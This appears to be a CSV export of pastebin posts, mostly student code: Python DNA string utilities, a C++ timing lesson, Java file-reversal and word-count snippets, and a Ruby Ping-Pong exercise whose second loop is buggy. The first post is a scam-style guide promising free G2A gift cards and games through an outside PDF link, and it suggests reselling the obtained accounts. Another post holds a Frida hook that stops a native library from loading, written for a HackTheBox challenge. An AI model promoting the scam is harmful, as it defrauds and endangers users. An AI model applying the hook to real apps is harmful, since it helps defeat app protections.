id,title,username,language,date,content
E9dNbiQm,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Tuesday 26th of March 2024 07:00:57 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
26 March 2024















































"
dfMBdPe6,data877,TestGuy1,JSON,Tuesday 26th of March 2024 07:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '3493823242877d7b49fead6c949e1f5c3cf8e159dbe134044f7f6ac4b1657f40810b9c1a8edaf78db773b07e848cf0e7fc9f225394d7dbede8be5626b090094e0648d64458f2411e9d9104f64b3f64f424236d75b5d6b2db2fefc42d8f1b104b7f265a90f523b90424893b80d12af5b1e460d90754faf50b063f1f7b1d9a0a71',
  otherdata: [
    '27c0dec1fd7abfa42e64c76bd6f50eb2',
    'a922252095adac994d69e77776c27faa',
    '734fb8cf8bd80b784ff7627a0043550c',
    '093b020ec73f025f103e79c65c7da1d4',
    '2471d895fa89232c38785d49b377cfdd',
    'bd6567cfcee3937dcabe2530054df69e',
    'fd5fd3d7dd9a638c9d68c03ab17f2307',
    '875159ff406d8db14b1fed1a31f2e615'
  ]
}"
LDs3rBKm,ООП_0_Обработка строк,plarmi,Python,Tuesday 26th of March 2024 06:57:48 AM CDT,"from random import choice, choices

nucleobase = ""AGCT""

start_codon = ""ATG""
stop_codon = (""TAG"", ""TAA"", ""TGA"")

def isPotentialGene(DNA: str):
    # длина кратна 3
    if (len(DNA) % 3) != 0:
        return False
    # начинается с кодона начала
    if not DNA.startswith(start_codon):
        return False
    # не имеет кодонов конца внутри
    for i in range(len(DNA) - 3):
        if i % 3 == 0:
            if DNA[i:i+3] in stop_codon:
                return False
    # завершается кодоном конца
    if DNA.endswith(stop_codon[0]):
        return True
    if DNA.endswith(stop_codon[1]):
        return True
    if DNA.endswith(stop_codon[2]):
        return True
    return False


# 0
def generateCodon(triplets: int):
    if triplets <= 0:
        raise ValueError(""the minimum number of triplets is 1"")
    codons = """"
    while triplets > 0:
        if (codon := """".join(choices(nucleobase, k=3))) not in stop_codon:
            codons += codon
            triplets -= 1
    return codons

def generateDNA(length: int):
    if length <= 6 or length % 3 != 0:
        raise ValueError(""the length of the DNA must be greater than six and a multiple of six"")
    return start_codon + generateCodon(int((length - 6) / 3)) + choice(stop_codon)

# 1
def isValidDNA(st: str):
    return set(st).issubset(nucleobase)

# 2
def complementWC(DNA: str):
    return ''.join([{'A': 'T', 'T': 'A', 'C': 'G', 'G': 'C'}[base] for base in DNA])

# 3
def palindromeWC(DNA: str):
    return DNA == complementWC(DNA)[::-1]

# 4
def isShift(s: str, t: str):
    return len(s) == len(t) and t in s + s

# 5
def find_PotentialGene(DNA: str, length: int):
    potential_genes = []
    for i in range(len(DNA)):
        if DNA[i:i+3] == start_codon:
            for j in range(i+3, len(DNA), 3):
                if DNA[j:j+3] in stop_codon:
                    gene = DNA[i:j+3]
                    if len(gene) >= length and len(gene) % 3 == 0:
                        potential_genes.append(gene)
                    break
    if not potential_genes:
        return None
    return potential_genes

# 6
def caesar_cipher(text: str, ROT: int, decipher=False):
    if ROT < 0:
        raise ValueError(""the number of shifts must be greater than or equal to zero"")
    encrypted_text = """"
    if decipher:
        ROT = -ROT
    for char in text:
        if char.isalpha():
            shifted = ord(char) + ROT
            if char.islower():
                if shifted > ord(""z""):
                    shifted -= 26
                elif shifted < ord(""a""):
                    shifted += 26
            elif char.isupper():
                if shifted > ord(""Z""):
                    shifted -= 26
                elif shifted < ord(""A""):
                    shifted += 26
            encrypted_text += chr(shifted)
        else:
            encrypted_text += char
    if not encrypted_text:
        return None
    return encrypted_text"
xznGgnZM,"СПРИНТ № 6 | Профилируем и ускоряем | Урок 7: Проверяем, всё ли ускорили",chevengur,C++,Tuesday 26th of March 2024 06:52:43 AM CDT,"log_duration.h

#pragma once

#include <chrono>
#include <iostream>

#define PROFILE_CONCAT_INTERNAL(X, Y) X##Y
#define PROFILE_CONCAT(X, Y) PROFILE_CONCAT_INTERNAL(X, Y)
#define UNIQUE_VAR_NAME_PROFILE PROFILE_CONCAT(profileGuard, __LINE__)
#define LOG_DURATION(x) LogDuration UNIQUE_VAR_NAME_PROFILE(x)

class LogDuration {
public:
    // заменим имя типа std::chrono::steady_clock
    // с помощью using для удобства
    using Clock = std::chrono::steady_clock;

    LogDuration(const std::string& id) : id_(id) {
    }

    ~LogDuration() {
        using namespace std::chrono;
        using namespace std::literals;

        const auto end_time = Clock::now();
        const auto dur = end_time - start_time_;
        std::cerr << id_ << "": ""s << duration_cast<milliseconds>(dur).count() << "" ms""s << std::endl;
    }

private:
    const std::string id_;
    const Clock::time_point start_time_ = Clock::now();
};

***************************************************************************************************************************************
main.cpp

#include <chrono>
#include <cstdlib>
#include <iostream>
#include <vector>
#include <algorithm>
#include ""log_duration.h""

using namespace std;

vector<int> ReverseVector(const std::vector<int>& source_vector) {
    std::vector<int> res(source_vector.size());
    std::reverse_copy(source_vector.begin(), source_vector.end(), res.begin());
    return res;
}

int CountPops(const vector<int>& source_vector, int begin, int end) {
    int res = 0;

    for (int i = begin; i < end; ++i) {
        if (source_vector[i]) {
            ++res;
        }
    }

    return res;
}

void AppendRandom(vector<int>& v, int n) {
    v.reserve(n);
    for (int i = 0; i < n; ++i) {
        // получаем случайное число с помощью функции rand.
        // с помощью (rand() % 2) получим целое число в диапазоне 0..1.
        // в C++ имеются более современные генераторы случайных чисел,
        // но в данном уроке не будем их касаться
        v.push_back(rand() % 2);
    }
}

void Operate() {
    {
        LOG_DURATION(""Total"");

        vector<int> random_bits;

        // операция << для целых чисел это сдвиг всех бит в двоичной
        // записи числа. Запишем с её помощью число 2 в степени 17 (131072)
        static const int N = 1 << 17;

        // заполним вектор случайными числами 0 и 1
        {
            LOG_DURATION(""Append random"");
            AppendRandom(random_bits, N);
        }

        vector<int> reversed_bits;
        // перевернём вектор задом наперёд
        {
            LOG_DURATION(""Reverse"");
            reversed_bits = ReverseVector(random_bits);
        }

        {
            LOG_DURATION(""Counting"");
            for (int i = 1, step = 1; i <= N; i += step, step *= 2) {
                double rate = CountPops(reversed_bits, 0, i) * 100. / i;
                cout << ""After ""s << i << "" bits we found ""s << rate << ""% pops""s << endl;
            }
        }
    }
}

int main() {
    Operate();
}"
XpFdrGfP,Untitled,Corbi098,Java,Tuesday 26th of March 2024 06:50:16 AM CDT,"    public static void main(String[] args) {
        File output = new File(""output.txt"");
        File input = new File(""input.txt"");
        if (!output.exists()) return;
        if (!input.exists()) {
            try {
                if (!input.createNewFile()) throw new IOException();
            } catch (IOException e) {
                throw new RuntimeException(""Can't create input.txt file"");
            }
        }
        try (BufferedReader reader = new BufferedReader(new FileReader(""output.txt""));
             BufferedWriter writer = new BufferedWriter(new FileWriter(""input.txt""))) {
            StringBuilder text = new StringBuilder(reader.readLine());
            if (!text.isEmpty())
                writer.write(text.reverse().toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }"
mYvdyzMz,Untitled,Corbi098,Java,Tuesday 26th of March 2024 06:44:54 AM CDT,"    public static void main(String[] args) throws IOException {
        try (BufferedReader reader = new BufferedReader(new FileReader(""output.txt""));
             BufferedWriter writer = new BufferedWriter(new FileWriter(""input.txt""))) {
            StringBuilder text = new StringBuilder();
            while (reader.ready()) {
                text.append(reader.readLine()).append(""\n"");
            }
            writer.write(text.reverse().toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }"
nNKqu2nn,Untitled,Corbi098,Java,Tuesday 26th of March 2024 06:44:04 AM CDT,"    public static void main(String[] args) throws IOException {
        try (BufferedReader reader = new BufferedReader(new FileReader(""input.txt""));
             BufferedWriter writer = new BufferedWriter(new FileWriter(""output.txt""))) {
            StringBuilder text = new StringBuilder();
            while (reader.ready()) {
                text.append(reader.readLine()).append(""\n"");
            }
            writer.write(text.reverse().toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }"
ZcZ0Qjj0,disable to load OS file to bypass frida server,Mr_hEx,JavaScript,Tuesday 26th of March 2024 06:43:06 AM CDT,"// HackTheBox challenge mobile => Waiting

Java.perform(function () {
    var System = Java.use('java.lang.System');
    System.loadLibrary.overload('java.lang.String').implementation = function (library) {
        console.log('[+] LoadLibrary call: ' + library);
        if (library === 'native-lib') {
            console.log('[+] bypass loading of '+ library);
        } else {
            this.loadLibrary(library);
        }
    };
});"
RJpZij4w,Aping-bpong,ramongr,Ruby,Tuesday 26th of March 2024 06:40:48 AM CDT,"# First I started with a descriptive method
# Every condition is layed out explicitly to make the code readable
# It's a good first candidate because it makes testing simple
(1..100).each do |number|
  if number % 3 == 0 && number % 5 == 0
    puts 'APingBPong'
  elsif number % 3 == 0 && number % 5 != 0
    puts 'APing'
  elsif number % 3 != 0 && number % 5 == 0
    puts 'BPong'
  else
    puts number
  end
end

# Even though there's no increase in complexity this version is slightly faster
# It checks if we can just print the number and goes on to the next
# If it can't just print the number, then it concatenates whicever strings match the individual checks
# Either for being a multiple of 3 or a multiple of 5
# We can leverage any unit tests written for the problem above
(1..100).each do |number|
  puts number and next if number % 3 != 0 && number % 5 != 0

  printable = """"
  if number % 3 == 0
    printable += 'APing'
  else number % 5 == 0
    printable += 'BPong'
  end
  puts printable
end"
xJ9hKVyM,Untitled,Corbi098,Java,Tuesday 26th of March 2024 06:40:24 AM CDT,"package org.example.xml;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

public class WordCounter {
    public static void main(String[] args) throws IOException {
        try (BufferedReader reader = new BufferedReader(new FileReader(""input.txt""))) {
            StringBuilder text = new StringBuilder();
            while (reader.ready()) {
                text.append(reader.readLine()).append("" "");
            }
            System.out.println(""Words: "" + text.toString().split("" "").length);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
"
